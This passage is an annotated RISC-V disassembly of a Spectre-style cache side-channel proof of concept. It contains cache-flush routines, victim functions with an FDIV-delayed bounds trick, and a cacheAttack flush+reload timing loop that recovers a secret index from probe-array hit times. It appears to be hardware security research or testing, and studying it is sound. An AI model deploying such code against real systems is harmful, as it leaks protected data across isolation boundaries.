    1fa0:	0780006f          	j	2018 <flushCache+0xec>
        // Combined with the for loop to move across the sets that you want to flush.
        uint32_t setOffset = (((memAddr & SET_MASK) >> L1_DCACHE_BLOCK_BITS) + i) << L1_DCACHE_BLOCK_BITS;
    1fa4:	fcc42783          	lw	a5,-52(s0)
    1fa8:	0037d793          	srli	a5,a5,0x3
    1fac:	7ff7f713          	andi	a4,a5,2047
    1fb0:	fe842783          	lw	a5,-24(s0)
    1fb4:	00f707b3          	add	a5,a4,a5
    1fb8:	00379793          	slli	a5,a5,0x3
    1fbc:	fcf42e23          	sw	a5,-36(s0)

        // There are N=L1_DCACHE_WAYS in a set to flush. And it needs to be repeated for MULTIPLIER-1 times since we have an extended dummyMem.
        for(uint32_t j = 0; j < ((MULTIPLIER-1)*L1_DCACHE_WAYS); ++j){
    1fc0:	fe042223          	sw	zero,-28(s0)
    1fc4:	03c0006f          	j	2000 <flushCache+0xd4>
        //for(uint32_t j = 0; j < L1_DCACHE_WAYS; ++j){
            // offset to reaccess the set
            uint32_t wayOffset = j << (L1_DCACHE_BLOCK_BITS + L1_DCACHE_SETS_BITS);
    1fc8:	fe442783          	lw	a5,-28(s0)
    1fcc:	00e79793          	slli	a5,a5,0xe
    1fd0:	fcf42c23          	sw	a5,-40(s0)

            // The processor will fetch needed (but empty, this property is important) data into the cache
			// as the following expression shows, which, due to same set bits and tags, evicts previous data.
            flush_junk = *((uint8_t*)(alignedMem + setOffset + wayOffset));
    1fd4:	fe042703          	lw	a4,-32(s0)
    1fd8:	fdc42783          	lw	a5,-36(s0)
    1fdc:	00f70733          	add	a4,a4,a5
    1fe0:	fd842783          	lw	a5,-40(s0)
    1fe4:	00f707b3          	add	a5,a4,a5
    1fe8:	0007c703          	lbu	a4,0(a5) # ffffc000 <__bss_end+0x7ffd2b54>
    1fec:	800007b7          	lui	a5,0x80000
    1ff0:	38e78423          	sb	a4,904(a5) # 80000388 <flush_junk>
        for(uint32_t j = 0; j < ((MULTIPLIER-1)*L1_DCACHE_WAYS); ++j){
    1ff4:	fe442783          	lw	a5,-28(s0)
    1ff8:	00178793          	addi	a5,a5,1
    1ffc:	fef42223          	sw	a5,-28(s0)
    2000:	fe442703          	lw	a4,-28(s0)
    2004:	00700793          	li	a5,7
    2008:	fce7f0e3          	bgeu	a5,a4,1fc8 <flushCache+0x9c>
    for (uint32_t i = 0; i < numSetsClear; ++i){
    200c:	fe842783          	lw	a5,-24(s0)
    2010:	00178793          	addi	a5,a5,1
    2014:	fef42423          	sw	a5,-24(s0)
    2018:	fe842703          	lw	a4,-24(s0)
    201c:	fec42783          	lw	a5,-20(s0)
    2020:	f8f762e3          	bltu	a4,a5,1fa4 <flushCache+0x78>
			// * indirection or dereferencing operator accesses the object the pointer points to.
        }
    }
}
    2024:	00000013          	nop
    2028:	00000013          	nop
    202c:	03c12403          	lw	s0,60(sp)
    2030:	04010113          	addi	sp,sp,64
    2034:	00008067          	ret

00002038 <victimFuncInit>:
uint8_t shift_base = 2;
uint32_t tempArray[ARRAY_SIZE_FACTOR];
uint32_t tempArrayIndex = 1;

void victimFuncInit(uint32_t targetIdx)
{
    2038:	fe010113          	addi	sp,sp,-32
    203c:	00812e23          	sw	s0,28(sp)
    2040:	02010413          	addi	s0,sp,32
    2044:	fea42623          	sw	a0,-20(s0)
/* Use a different index of tempArray to avoid effect of initial instruction cache miss.
 * Basically the form is kept the same as succeeding formal victimFunc since it is expected to simulate real scenes
 * where attacker has no access to valid address like targetIdx.
 */
	tempArray[0] = targetIdx;
    2048:	800297b7          	lui	a5,0x80029
    204c:	c9878793          	addi	a5,a5,-872 # 80028c98 <tempArray>
    2050:	fec42703          	lw	a4,-20(s0)
    2054:	00e7a023          	sw	a4,0(a5)
    tempArrayIndex = tempArrayIndex << 4;
    2058:	800007b7          	lui	a5,0x80000
    205c:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    2060:	00479713          	slli	a4,a5,0x4
    2064:	800007b7          	lui	a5,0x80000
    2068:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
    asm("fcvt.s.wu fa4, %[in]\n"
    206c:	800007b7          	lui	a5,0x80000
    2070:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    2074:	80000737          	lui	a4,0x80000
    2078:	39174703          	lbu	a4,913(a4) # 80000391 <shift_base>
    207c:	d0177753          	fcvt.s.wu	fa4,a4
    2080:	d017f7d3          	fcvt.s.wu	fa5,a5
    2084:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2088:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    208c:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2090:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2094:	c0179753          	fcvt.wu.s	a4,fa5,rtz
    2098:	800007b7          	lui	a5,0x80000
    209c:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
        "fdiv.s fa5, fa5, fa4\n"
        "fcvt.wu.s %[out], fa5, rtz\n"
        : [out] "=r" (tempArrayIndex)
        : [inout] "r" (tempArrayIndex), [in] "r" (shift_base)
        : "fa4", "fa5");
    tempArray[tempArrayIndex] = 0;
    20a0:	800007b7          	lui	a5,0x80000
    20a4:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    20a8:	80029737          	lui	a4,0x80029
    20ac:	c9870713          	addi	a4,a4,-872 # 80028c98 <tempArray>
    20b0:	00279793          	slli	a5,a5,0x2
    20b4:	00f707b3          	add	a5,a4,a5
    20b8:	0007a023          	sw	zero,0(a5)
	anchorVar &= probeArray[guideArray[tempArray[0]] * ARRAY_STRIDE];
    20bc:	800297b7          	lui	a5,0x80029
    20c0:	c9878793          	addi	a5,a5,-872 # 80028c98 <tempArray>
    20c4:	0007a783          	lw	a5,0(a5)
    20c8:	80028737          	lui	a4,0x80028
    20cc:	39870713          	addi	a4,a4,920 # 80028398 <guideArray>
    20d0:	00f707b3          	add	a5,a4,a5
    20d4:	0007c783          	lbu	a5,0(a5)
    20d8:	00379793          	slli	a5,a5,0x3
    20dc:	80028737          	lui	a4,0x80028
    20e0:	49870713          	addi	a4,a4,1176 # 80028498 <probeArray>
    20e4:	00f707b3          	add	a5,a4,a5
    20e8:	0007c703          	lbu	a4,0(a5)
    20ec:	800007b7          	lui	a5,0x80000
    20f0:	3907c783          	lbu	a5,912(a5) # 80000390 <anchorVar>
    20f4:	00f777b3          	and	a5,a4,a5
    20f8:	0ff7f713          	zext.b	a4,a5
    20fc:	800007b7          	lui	a5,0x80000
    2100:	38e78823          	sb	a4,912(a5) # 80000390 <anchorVar>
}
    2104:	00000013          	nop
    2108:	01c12403          	lw	s0,28(sp)
    210c:	02010113          	addi	sp,sp,32
    2110:	00008067          	ret

00002114 <victimFunc_00>:

void victimFunc_00(uint32_t targetIdx){
    2114:	fe010113          	addi	sp,sp,-32
    2118:	00812e23          	sw	s0,28(sp)
    211c:	02010413          	addi	s0,sp,32
    2120:	fea42623          	sw	a0,-20(s0)

	tempArray[1] = targetIdx;
    2124:	800297b7          	lui	a5,0x80029
    2128:	c9878793          	addi	a5,a5,-872 # 80028c98 <tempArray>
    212c:	fec42703          	lw	a4,-20(s0)
    2130:	00e7a223          	sw	a4,4(a5)

	tempArrayIndex = tempArrayIndex << 4;
    2134:	800007b7          	lui	a5,0x80000
    2138:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    213c:	00479713          	slli	a4,a5,0x4
    2140:	800007b7          	lui	a5,0x80000
    2144:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
	asm("fcvt.s.wu	fa4, %[in]\n"
    2148:	800007b7          	lui	a5,0x80000
    214c:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    2150:	80000737          	lui	a4,0x80000
    2154:	39174703          	lbu	a4,913(a4) # 80000391 <shift_base>
    2158:	d0177753          	fcvt.s.wu	fa4,a4
    215c:	d017f7d3          	fcvt.s.wu	fa5,a5
    2160:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2164:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2168:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    216c:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2170:	c0179753          	fcvt.wu.s	a4,fa5,rtz
    2174:	800007b7          	lui	a5,0x80000
    2178:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
		"fcvt.wu.s	%[out], fa5, rtz\n"
		: [out] "=r" (tempArrayIndex)
		: [inout] "r" (tempArrayIndex), [in] "r" (shift_base)
		: "fa4", "fa5");

	tempArray[tempArrayIndex] = 0;
    217c:	800007b7          	lui	a5,0x80000
    2180:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    2184:	80029737          	lui	a4,0x80029
    2188:	c9870713          	addi	a4,a4,-872 # 80028c98 <tempArray>
    218c:	00279793          	slli	a5,a5,0x2
    2190:	00f707b3          	add	a5,a4,a5
    2194:	0007a023          	sw	zero,0(a5)
	// "Quickly" load that value from that memory location.
	anchorVar &= probeArray[guideArray[tempArray[1]] * ARRAY_STRIDE];
    2198:	800297b7          	lui	a5,0x80029
    219c:	c9878793          	addi	a5,a5,-872 # 80028c98 <tempArray>
    21a0:	0047a783          	lw	a5,4(a5)
    21a4:	80028737          	lui	a4,0x80028
    21a8:	39870713          	addi	a4,a4,920 # 80028398 <guideArray>
    21ac:	00f707b3          	add	a5,a4,a5
    21b0:	0007c783          	lbu	a5,0(a5)
    21b4:	00379793          	slli	a5,a5,0x3
    21b8:	80028737          	lui	a4,0x80028
    21bc:	49870713          	addi	a4,a4,1176 # 80028498 <probeArray>
    21c0:	00f707b3          	add	a5,a4,a5
    21c4:	0007c703          	lbu	a4,0(a5)
    21c8:	800007b7          	lui	a5,0x80000
    21cc:	3907c783          	lbu	a5,912(a5) # 80000390 <anchorVar>
    21d0:	00f777b3          	and	a5,a4,a5
    21d4:	0ff7f713          	zext.b	a4,a5
    21d8:	800007b7          	lui	a5,0x80000
    21dc:	38e78823          	sb	a4,912(a5) # 80000390 <anchorVar>
}
    21e0:	00000013          	nop
    21e4:	01c12403          	lw	s0,28(sp)
    21e8:	02010113          	addi	sp,sp,32
    21ec:	00008067          	ret

000021f0 <victimFunc_01>:

void victimFunc_01(uint32_t targetIdx){
    21f0:	fe010113          	addi	sp,sp,-32
    21f4:	00812e23          	sw	s0,28(sp)
    21f8:	02010413          	addi	s0,sp,32
    21fc:	fea42623          	sw	a0,-20(s0)

	tempArray[1] = targetIdx;
    2200:	800297b7          	lui	a5,0x80029
    2204:	c9878793          	addi	a5,a5,-872 # 80028c98 <tempArray>
    2208:	fec42703          	lw	a4,-20(s0)
    220c:	00e7a223          	sw	a4,4(a5)

	tempArrayIndex = tempArrayIndex << 4;
    2210:	800007b7          	lui	a5,0x80000
    2214:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    2218:	00479713          	slli	a4,a5,0x4
    221c:	800007b7          	lui	a5,0x80000
    2220:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
	asm("fcvt.s.wu	fa4, %[in]\n"
    2224:	800007b7          	lui	a5,0x80000
    2228:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    222c:	80000737          	lui	a4,0x80000
    2230:	39174703          	lbu	a4,913(a4) # 80000391 <shift_base>
    2234:	d0177753          	fcvt.s.wu	fa4,a4
    2238:	d017f7d3          	fcvt.s.wu	fa5,a5
    223c:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2240:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2244:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2248:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    224c:	c0179753          	fcvt.wu.s	a4,fa5,rtz
    2250:	800007b7          	lui	a5,0x80000
    2254:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
		"fcvt.wu.s	%[out], fa5, rtz\n"
		: [out] "=r" (tempArrayIndex)
		: [inout] "r" (tempArrayIndex), [in] "r" (shift_base)
		: "fa4", "fa5");

	tempArray[tempArrayIndex] = 0;
    2258:	800007b7          	lui	a5,0x80000
    225c:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    2260:	80029737          	lui	a4,0x80029
    2264:	c9870713          	addi	a4,a4,-872 # 80028c98 <tempArray>
    2268:	00279793          	slli	a5,a5,0x2
    226c:	00f707b3          	add	a5,a4,a5
    2270:	0007a023          	sw	zero,0(a5)
	// "Quickly" load that value from that memory location.
	anchorVar &= probeArray[guideArray[tempArray[1]] * ARRAY_STRIDE];
    2274:	800297b7          	lui	a5,0x80029
    2278:	c9878793          	addi	a5,a5,-872 # 80028c98 <tempArray>
    227c:	0047a783          	lw	a5,4(a5)
    2280:	80028737          	lui	a4,0x80028
    2284:	39870713          	addi	a4,a4,920 # 80028398 <guideArray>
    2288:	00f707b3          	add	a5,a4,a5
    228c:	0007c783          	lbu	a5,0(a5)
    2290:	00379793          	slli	a5,a5,0x3
    2294:	80028737          	lui	a4,0x80028
    2298:	49870713          	addi	a4,a4,1176 # 80028498 <probeArray>
    229c:	00f707b3          	add	a5,a4,a5
    22a0:	0007c703          	lbu	a4,0(a5)
    22a4:	800007b7          	lui	a5,0x80000
    22a8:	3907c783          	lbu	a5,912(a5) # 80000390 <anchorVar>
    22ac:	00f777b3          	and	a5,a4,a5
    22b0:	0ff7f713          	zext.b	a4,a5
    22b4:	800007b7          	lui	a5,0x80000
    22b8:	38e78823          	sb	a4,912(a5) # 80000390 <anchorVar>
}
    22bc:	00000013          	nop
    22c0:	01c12403          	lw	s0,28(sp)
    22c4:	02010113          	addi	sp,sp,32
    22c8:	00008067          	ret

000022cc <victimFunc_02>:

void victimFunc_02(uint32_t targetIdx){
    22cc:	fe010113          	addi	sp,sp,-32
    22d0:	00812e23          	sw	s0,28(sp)
    22d4:	02010413          	addi	s0,sp,32
    22d8:	fea42623          	sw	a0,-20(s0)

	tempArray[1] = targetIdx;
    22dc:	800297b7          	lui	a5,0x80029
    22e0:	c9878793          	addi	a5,a5,-872 # 80028c98 <tempArray>
    22e4:	fec42703          	lw	a4,-20(s0)
    22e8:	00e7a223          	sw	a4,4(a5)

	tempArrayIndex = tempArrayIndex << 4;
    22ec:	800007b7          	lui	a5,0x80000
    22f0:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    22f4:	00479713          	slli	a4,a5,0x4
    22f8:	800007b7          	lui	a5,0x80000
    22fc:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
	asm("fcvt.s.wu	fa4, %[in]\n"
    2300:	800007b7          	lui	a5,0x80000
    2304:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    2308:	80000737          	lui	a4,0x80000
    230c:	39174703          	lbu	a4,913(a4) # 80000391 <shift_base>
    2310:	d0177753          	fcvt.s.wu	fa4,a4
    2314:	d017f7d3          	fcvt.s.wu	fa5,a5
    2318:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    231c:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2320:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2324:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2328:	c0179753          	fcvt.wu.s	a4,fa5,rtz
    232c:	800007b7          	lui	a5,0x80000
    2330:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
		"fcvt.wu.s	%[out], fa5, rtz\n"
		: [out] "=r" (tempArrayIndex)
		: [inout] "r" (tempArrayIndex), [in] "r" (shift_base)
		: "fa4", "fa5");

	tempArray[tempArrayIndex] = 0;
    2334:	800007b7          	lui	a5,0x80000
    2338:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    233c:	80029737          	lui	a4,0x80029
    2340:	c9870713          	addi	a4,a4,-872 # 80028c98 <tempArray>
    2344:	00279793          	slli	a5,a5,0x2
    2348:	00f707b3          	add	a5,a4,a5
    234c:	0007a023          	sw	zero,0(a5)
	// "Quickly" load that value from that memory location.
	anchorVar &= probeArray[guideArray[tempArray[1]] * ARRAY_STRIDE];
    2350:	800297b7          	lui	a5,0x80029
    2354:	c9878793          	addi	a5,a5,-872 # 80028c98 <tempArray>
    2358:	0047a783          	lw	a5,4(a5)
    235c:	80028737          	lui	a4,0x80028
    2360:	39870713          	addi	a4,a4,920 # 80028398 <guideArray>
    2364:	00f707b3          	add	a5,a4,a5
    2368:	0007c783          	lbu	a5,0(a5)
    236c:	00379793          	slli	a5,a5,0x3
    2370:	80028737          	lui	a4,0x80028
    2374:	49870713          	addi	a4,a4,1176 # 80028498 <probeArray>
    2378:	00f707b3          	add	a5,a4,a5
    237c:	0007c703          	lbu	a4,0(a5)
    2380:	800007b7          	lui	a5,0x80000
    2384:	3907c783          	lbu	a5,912(a5) # 80000390 <anchorVar>
    2388:	00f777b3          	and	a5,a4,a5
    238c:	0ff7f713          	zext.b	a4,a5
    2390:	800007b7          	lui	a5,0x80000
    2394:	38e78823          	sb	a4,912(a5) # 80000390 <anchorVar>
}
    2398:	00000013          	nop
    239c:	01c12403          	lw	s0,28(sp)
    23a0:	02010113          	addi	sp,sp,32
    23a4:	00008067          	ret

000023a8 <victimFunc_03>:

void victimFunc_03(uint32_t targetIdx){
    23a8:	fe010113          	addi	sp,sp,-32
    23ac:	00812e23          	sw	s0,28(sp)
    23b0:	02010413          	addi	s0,sp,32
    23b4:	fea42623          	sw	a0,-20(s0)

	tempArray[1] = targetIdx;
    23b8:	800297b7          	lui	a5,0x80029
    23bc:	c9878793          	addi	a5,a5,-872 # 80028c98 <tempArray>
    23c0:	fec42703          	lw	a4,-20(s0)
    23c4:	00e7a223          	sw	a4,4(a5)

	tempArrayIndex = tempArrayIndex << 4;
    23c8:	800007b7          	lui	a5,0x80000
    23cc:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    23d0:	00479713          	slli	a4,a5,0x4
    23d4:	800007b7          	lui	a5,0x80000
    23d8:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
	asm("fcvt.s.wu	fa4, %[in]\n"
    23dc:	800007b7          	lui	a5,0x80000
    23e0:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    23e4:	80000737          	lui	a4,0x80000
    23e8:	39174703          	lbu	a4,913(a4) # 80000391 <shift_base>
    23ec:	d0177753          	fcvt.s.wu	fa4,a4
    23f0:	d017f7d3          	fcvt.s.wu	fa5,a5
    23f4:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    23f8:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    23fc:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2400:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    2404:	c0179753          	fcvt.wu.s	a4,fa5,rtz
    2408:	800007b7          	lui	a5,0x80000
    240c:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
		"fcvt.wu.s	%[out], fa5, rtz\n"
		: [out] "=r" (tempArrayIndex)
		: [inout] "r" (tempArrayIndex), [in] "r" (shift_base)
		: "fa4", "fa5");

	tempArray[tempArrayIndex] = 0;
    2410:	800007b7          	lui	a5,0x80000
    2414:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    2418:	80029737          	lui	a4,0x80029
    241c:	c9870713          	addi	a4,a4,-872 # 80028c98 <tempArray>
    2420:	00279793          	slli	a5,a5,0x2
    2424:	00f707b3          	add	a5,a4,a5
    2428:	0007a023          	sw	zero,0(a5)
	// "Quickly" load that value from that memory location.
	anchorVar &= probeArray[guideArray[tempArray[1]] * ARRAY_STRIDE];
    242c:	800297b7          	lui	a5,0x80029
    2430:	c9878793          	addi	a5,a5,-872 # 80028c98 <tempArray>
    2434:	0047a783          	lw	a5,4(a5)
    2438:	80028737          	lui	a4,0x80028
    243c:	39870713          	addi	a4,a4,920 # 80028398 <guideArray>
    2440:	00f707b3          	add	a5,a4,a5
    2444:	0007c783          	lbu	a5,0(a5)
    2448:	00379793          	slli	a5,a5,0x3
    244c:	80028737          	lui	a4,0x80028
    2450:	49870713          	addi	a4,a4,1176 # 80028498 <probeArray>
    2454:	00f707b3          	add	a5,a4,a5
    2458:	0007c703          	lbu	a4,0(a5)
    245c:	800007b7          	lui	a5,0x80000
    2460:	3907c783          	lbu	a5,912(a5) # 80000390 <anchorVar>
    2464:	00f777b3          	and	a5,a4,a5
    2468:	0ff7f713          	zext.b	a4,a5
    246c:	800007b7          	lui	a5,0x80000
    2470:	38e78823          	sb	a4,912(a5) # 80000390 <anchorVar>
}
    2474:	00000013          	nop
    2478:	01c12403          	lw	s0,28(sp)
    247c:	02010113          	addi	sp,sp,32
    2480:	00008067          	ret

00002484 <victimFunc_04>:

void victimFunc_04(uint32_t targetIdx){
    2484:	fe010113          	addi	sp,sp,-32
    2488:	00812e23          	sw	s0,28(sp)
    248c:	02010413          	addi	s0,sp,32
    2490:	fea42623          	sw	a0,-20(s0)

	tempArray[1] = targetIdx;
    2494:	800297b7          	lui	a5,0x80029
    2498:	c9878793          	addi	a5,a5,-872 # 80028c98 <tempArray>
    249c:	fec42703          	lw	a4,-20(s0)
    24a0:	00e7a223          	sw	a4,4(a5)

	tempArrayIndex = tempArrayIndex << 4;
    24a4:	800007b7          	lui	a5,0x80000
    24a8:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    24ac:	00479713          	slli	a4,a5,0x4
    24b0:	800007b7          	lui	a5,0x80000
    24b4:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
	asm("fcvt.s.wu	fa4, %[in]\n"
    24b8:	800007b7          	lui	a5,0x80000
    24bc:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    24c0:	80000737          	lui	a4,0x80000
    24c4:	39174703          	lbu	a4,913(a4) # 80000391 <shift_base>
    24c8:	d0177753          	fcvt.s.wu	fa4,a4
    24cc:	d017f7d3          	fcvt.s.wu	fa5,a5
    24d0:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    24d4:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    24d8:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    24dc:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    24e0:	c0179753          	fcvt.wu.s	a4,fa5,rtz
    24e4:	800007b7          	lui	a5,0x80000
    24e8:	38e7aa23          	sw	a4,916(a5) # 80000394 <tempArrayIndex>
		"fcvt.wu.s	%[out], fa5, rtz\n"
		: [out] "=r" (tempArrayIndex)
		: [inout] "r" (tempArrayIndex), [in] "r" (shift_base)
		: "fa4", "fa5");

	tempArray[tempArrayIndex] = 0;
    24ec:	800007b7          	lui	a5,0x80000
    24f0:	3947a783          	lw	a5,916(a5) # 80000394 <tempArrayIndex>
    24f4:	80029737          	lui	a4,0x80029
    24f8:	c9870713          	addi	a4,a4,-872 # 80028c98 <tempArray>
    24fc:	00279793          	slli	a5,a5,0x2
    2500:	00f707b3          	add	a5,a4,a5
    2504:	0007a023          	sw	zero,0(a5)
	// "Quickly" load that value from that memory location.
	anchorVar &= probeArray[guideArray[tempArray[1]] * ARRAY_STRIDE];
    2508:	800297b7          	lui	a5,0x80029
    250c:	c9878793          	addi	a5,a5,-872 # 80028c98 <tempArray>
    2510:	0047a783          	lw	a5,4(a5)
    2514:	80028737          	lui	a4,0x80028
    2518:	39870713          	addi	a4,a4,920 # 80028398 <guideArray>
    251c:	00f707b3          	add	a5,a4,a5
    2520:	0007c783          	lbu	a5,0(a5)
    2524:	00379793          	slli	a5,a5,0x3
    2528:	80028737          	lui	a4,0x80028
    252c:	49870713          	addi	a4,a4,1176 # 80028498 <probeArray>
    2530:	00f707b3          	add	a5,a4,a5
    2534:	0007c703          	lbu	a4,0(a5)
    2538:	800007b7          	lui	a5,0x80000
    253c:	3907c783          	lbu	a5,912(a5) # 80000390 <anchorVar>
    2540:	00f777b3          	and	a5,a4,a5
    2544:	0ff7f713          	zext.b	a4,a5
    2548:	800007b7          	lui	a5,0x80000
    254c:	38e78823          	sb	a4,912(a5) # 80000390 <anchorVar>
}
    2550:	00000013          	nop
    2554:	01c12403          	lw	s0,28(sp)
    2558:	02010113          	addi	sp,sp,32
    255c:	00008067          	ret

00002560 <cacheAttack>:

// TBD: mix the order in other ways.
#define MIXER_A 65 // min 65. 163, 167, 127, 111. Must be larger than 64.
#define MIXER_B 1 // Arbitrary as long as larger than 0.

void cacheAttack(uint8_t* outIdx, uint32_t* outTimes){
    2560:	fd010113          	addi	sp,sp,-48
    2564:	02812623          	sw	s0,44(sp)
    2568:	02912423          	sw	s1,40(sp)
    256c:	03010413          	addi	s0,sp,48
    2570:	fca42e23          	sw	a0,-36(s0)
    2574:	fcb42c23          	sw	a1,-40(s0)

	register uint32_t start, diff; // Use register variables (can only be local) to reduce access time.
	// Read out probeArray and see the hit secret value.
	/* Time reads. Order is slightly mixed up to prevent stride prediction (prefetching). */
	for (int i = 0; i < ARRAY_SIZE_FACTOR; i++) {
    2578:	fe042623          	sw	zero,-20(s0)
    257c:	0c00006f          	j	263c <cacheAttack+0xdc>
		mixed_i = ((i * MIXER_A) + MIXER_B) & (ARRAY_SIZE_FACTOR-1);
    2580:	fec42703          	lw	a4,-20(s0)
    2584:	00070793          	mv	a5,a4
    2588:	00679793          	slli	a5,a5,0x6
    258c:	00e787b3          	add	a5,a5,a4
    2590:	00178793          	addi	a5,a5,1
    2594:	0ff7f713          	zext.b	a4,a5
    2598:	800297b7          	lui	a5,0x80029
    259c:	48e7ac23          	sw	a4,1176(a5) # 80029498 <mixed_i>
		start = READ_CSR(mcycle);
    25a0:	b00027f3          	csrr	a5,mcycle
    25a4:	fef42223          	sw	a5,-28(s0)
    25a8:	fe442783          	lw	a5,-28(s0)
    25ac:	00078493          	mv	s1,a5
		//There should be nothing between these 2 rows, otherwise you need to adjust the threshold. 
		dummy &= probeArray[mixed_i * ARRAY_STRIDE];
    25b0:	800297b7          	lui	a5,0x80029
    25b4:	4987a783          	lw	a5,1176(a5) # 80029498 <mixed_i>
    25b8:	00379793          	slli	a5,a5,0x3
    25bc:	80028737          	lui	a4,0x80028
    25c0:	49870713          	addi	a4,a4,1176 # 80028498 <probeArray>
    25c4:	00f707b3          	add	a5,a4,a5
    25c8:	0007c783          	lbu	a5,0(a5)
    25cc:	00078713          	mv	a4,a5
    25d0:	800297b7          	lui	a5,0x80029
    25d4:	49c7a783          	lw	a5,1180(a5) # 8002949c <dummy>
    25d8:	00f77733          	and	a4,a4,a5
    25dc:	800297b7          	lui	a5,0x80029
    25e0:	48e7ae23          	sw	a4,1180(a5) # 8002949c <dummy>
		diff = (READ_CSR(mcycle) - start);
    25e4:	b00027f3          	csrr	a5,mcycle
    25e8:	fef42023          	sw	a5,-32(s0)
    25ec:	fe042783          	lw	a5,-32(s0)
    25f0:	409784b3          	sub	s1,a5,s1

		// Condition: interval of time is smaller than the threshold.
		if ((uint32_t)diff < CACHE_HIT_THRESHOLD){
    25f4:	02400793          	li	a5,36
    25f8:	0297ec63          	bltu	a5,s1,2630 <cacheAttack+0xd0>
			results[mixed_i]++; /* Cache hit */
    25fc:	800297b7          	lui	a5,0x80029
    2600:	4987a783          	lw	a5,1176(a5) # 80029498 <mixed_i>
    2604:	80029737          	lui	a4,0x80029
    2608:	09870693          	addi	a3,a4,152 # 80029098 <results>
    260c:	00279713          	slli	a4,a5,0x2
    2610:	00e68733          	add	a4,a3,a4
    2614:	00072703          	lw	a4,0(a4)
    2618:	00170713          	addi	a4,a4,1
    261c:	800296b7          	lui	a3,0x80029
    2620:	09868693          	addi	a3,a3,152 # 80029098 <results>
    2624:	00279793          	slli	a5,a5,0x2
    2628:	00f687b3          	add	a5,a3,a5
    262c:	00e7a023          	sw	a4,0(a5)
	for (int i = 0; i < ARRAY_SIZE_FACTOR; i++) {
    2630:	fec42783          	lw	a5,-20(s0)
    2634:	00178793          	addi	a5,a5,1
    2638:	fef42623          	sw	a5,-20(s0)
    263c:	fec42703          	lw	a4,-20(s0)
    2640:	0ff00793          	li	a5,255
    2644:	f2e7dee3          	bge	a5,a4,2580 <cacheAttack+0x20>
		}
	}
	/* Use junk so above 'dummy=' row won't get optimized out. Order of the following instructions seems to be in a fixed position. */
	/* results[0] of static array results() will always be translated into a NULL control character in ASCII or Unicode, so don't worry. */
	/* ^ bitwise exclusive OR sets a one in each bit position where its operands have different bits, and zero where they are the same.*/
	results[0] ^= dummy;
    2648:	800297b7          	lui	a5,0x80029
    264c:	09878793          	addi	a5,a5,152 # 80029098 <results>
    2650:	0007a703          	lw	a4,0(a5)
    2654:	800297b7          	lui	a5,0x80029
    2658:	49c7a783          	lw	a5,1180(a5) # 8002949c <dummy>
    265c:	00f74733          	xor	a4,a4,a5
    2660:	800297b7          	lui	a5,0x80029
    2664:	09878793          	addi	a5,a5,152 # 80029098 <results>
    2668:	00e7a023          	sw	a4,0(a5)

	outIdx[0] = 0;
    266c:	fdc42783          	lw	a5,-36(s0)
    2670:	00078023          	sb	zero,0(a5)
	outTimes[0] = 0;
    2674:	fd842783          	lw	a5,-40(s0)
    2678:	0007a023          	sw	zero,0(a5)

	for (uint32_t i = 0; i < RESULT_ARRAY_SIZE; i++){
    267c:	fe042423          	sw	zero,-24(s0)
    2680:	0640006f          	j	26e4 <cacheAttack+0x184>
		if (results[i] > outTimes[0]){
    2684:	800297b7          	lui	a5,0x80029
    2688:	09878713          	addi	a4,a5,152 # 80029098 <results>
    268c:	fe842783          	lw	a5,-24(s0)
    2690:	00279793          	slli	a5,a5,0x2
    2694:	00f707b3          	add	a5,a4,a5
